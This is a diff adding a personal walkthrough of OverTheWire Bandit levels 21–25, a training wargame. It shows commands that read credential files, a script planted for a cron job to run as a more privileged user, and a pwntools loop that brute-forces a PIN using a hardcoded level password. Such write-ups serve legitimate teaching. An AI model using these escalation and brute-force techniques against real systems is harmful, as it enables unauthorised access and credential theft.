@@ -334,3 +334,208 @@ Lastly, I pasted the current password to the terminal listening.
 `*Current password*`
 
 
+#Level 21:
+So we need to read the cron.d to see the programs being ran automatically.
+
+`ls /etc/cron.d`
+`clean_tmp  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  e2scrub_all  otw-tmp-dir  sysstat`
+
+Let's take a look at cronjob_bandit22.
+
+`cat /etc/cron.d/cronjob_bandit22`
+`* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null`
+
+Let's see if we can read this file.
+
+`ls /usr/bin/cronjob_* -la`
+`-rwxr-x--- 1 bandit22 bandit21 130 Apr 10 14:23 /usr/bin/cronjob_bandit22.sh
+-rwxr-x--- 1 bandit23 bandit22 211 Apr 10 14:23 /usr/bin/cronjob_bandit23.sh
+-rwxr-x--- 1 bandit24 bandit23 384 Apr 10 14:23 /usr/bin/cronjob_bandit24.sh`
+
+It seems that for this and the next two challenges, we can read and execute the file that is being cron'd, this is because the owner group for each file is the bandit user that is a level before itself, and there are read rights for groups for the three files.
+
+Let's read our current challenge's file.
+
+`cat /usr/bin/cronjob_bandit22.sh`
+`#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv`
+
+It's a small Bash script that gives permissions to a certain file in the /tmp directory, allowing everyone to read it.
+Then the content of the file /etc/bandit_pass_bandit22 is pushed to it, overwriting the file's content.
+The data pushed is the password for this level, so we just need to run it, then read the relevant file.
+
+-solution:
+`/usr/bin/cronjob_bandit22.sh`
+``
+`cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv`
+
+
+#Level 23:
+As I found out on the last level, there is a file we can read and execute relating to this level.
+
+`cat /usr/bin/cronjob_bandit23.sh`
+`#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget`
+
+This Bash script that takes the user's name along side some extra text:
+I am user Bandit22
+Then gets the MD5 hash created by that string (and also parses our extra text from the md5sum command).
+Lastly, it copies the password for this level to a file in the /tmp directory, with the name being the MD5 hash.
+
+So all we need to do is run the script, and it would let us know the location of the file.
+Seems too easy but let's try.
+
+`/usr/bin/cronjob_bandit23.sh`
+`Copying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3`
+`cat /tmp/8169b67bd894ddbb4412f91573b38db3`
+`*Level 22's password*`
+
+Now it makes sense, if I run this script as bandit22, it would copy the current user's password, it being bandit22, so we need it to run as bandit23.
+This is a file being run using cron, so it might be ran by bandit23, let's check.
+
+`cat /etc/cron.d/cronjob_bandit23`
+`@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null`
+
+Good, it is being ran by bandit23, so all we have to do is figure out the MD5 hash created from the message "I am user bandit23", and we should find this level's password in it.
+
+-solution:
+`echo "I am user bandit23" | md5sum | cut -d ' ' -f1`
+`8ca319486bfbbc3663ea0fbe81326349`
+`cat /tmp/8ca319486bfbbc3663ea0fbe81326349`
+
+
+#Level 24:
+As with the past 2 levels, we have a file being ran by cron relating to this challenge, so let's read it.
+
+`cat /usr/bin/cronjob_bandit24.sh`
+`#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done`
+
+So we are ramping up, I like it.
+This script goes into a directory depending on the user running it, looping over all files and if their owner is specifically bandit23, it runs it with a timeout of 60 seconds before it kills the proccess.
+
+So I, logged into bandit23, need to create a script, that will be executed as bandit24.
+Let's create an automation that copies this level's password to a file in the /tmp directory.
+
+`#!/bin/bash
+cp /etc/bandit_pass/bandit24 /tmp/bandit24amit`
+
+But how would it run? and as bandit24?
+Looking at the cron job for this file, we see bandit24 is the user that runs it, and it runs every minute, as indicated by five *.
+
+`cat /etc/cron.d/cronjob_bandit24`
+`@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null`
+
+After we created the automation, we just have to wait to the next server rounded mintue.
+We can watch it's status of creation using the "watch" command.
+
+`ls -la /tmp/bandit24amit`
+
+Weird, this didn't work. Maybe bandit24 lacks the permissions to run the automation, let's make sure he can.
+
+`chmod 777 /var/spool/bandit24/foo/amit`
+
+Okay, we got something!
+The "No such file or directory" error changed to "Permission denied".
+That's because the file is being created by bandit24, so as bandit23 I couldn't read it, let's add the following line to our script (which has been deleted, but I used vim with ctrl+z to have it's content in my vim's bufffer)
+
+`chmod 777 /tmp/amit`
+
+Boom, with all the pieces in place, we can cat out the password.
+
+`cat /tmp/amit`
+
+
+#Level 25:
+Interesting, we need to create a script to brute force the password.
+I see pwntools is available for python, this is great, let's create a python file using pwntools.
+
+`from pwn import *
+
+code = 0
+c = remote('localhost',30002)
+
+while code < 10000:
+    if code < 10:
+        formatted_code = f"000{str(code)}"
+    elif code < 100:
+        formatted_code = f"00{str(code)}"
+    elif code < 1000:
+        formatted_code = f"0{str(code)}"
+    else:
+        formatted_code = f"{str(code)}"
+    print(f"fcode:{formatted_code}")
+
+    c.sendline(f"gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 {formatted_code}")
+    resp = c.recvuntil("Wrong!",timeout=10)
+    print(f"Response: {resp.decode(errors='ignore')}")
+    code += 1`
+
+Now let's run it.
+
+`python3 /tmp/bandit24.py`
+`*...*
+Response:  Please enter the correct current password and pincode. Try again.
+Wrong!
+fcode:2217
+Response:  Please enter the correct current password and pincode. Try again.
+Wrong!
+fcode:2218
+Response:  Please enter the correct current password and pincode. Try again.
+Wrong!
+fcode:2219
+Traceback (most recent call last):
+  File "/tmp/bandit24.py", line 18, in <module>
+    resp = c.recvuntil("Wrong!",timeout=10)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py", line 341, in recvuntil
+    res = self.recv(timeout=self.timeout)
+          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py", line 106, in recv
+    return self._recv(numb, timeout) or b''
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py", line 176, in _recv
+    if not self.buffer and not self._fillbuffer(timeout):
+                               ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py", line 155, in _fillbuffer
+    data = self.recv_raw(self.buffer.get_fill_size())
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/pwnlib/tubes/sock.py", line 56, in recv_raw
+    raise EOFError
+EOFError
+[*] Closed connection to localhost port 30002`
+
+So it broke right after inserting 2219, let's manually try it.
+
+`nc localhost 30002`
+`I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+*Current password* 2219
+Correct!`
+
+
+
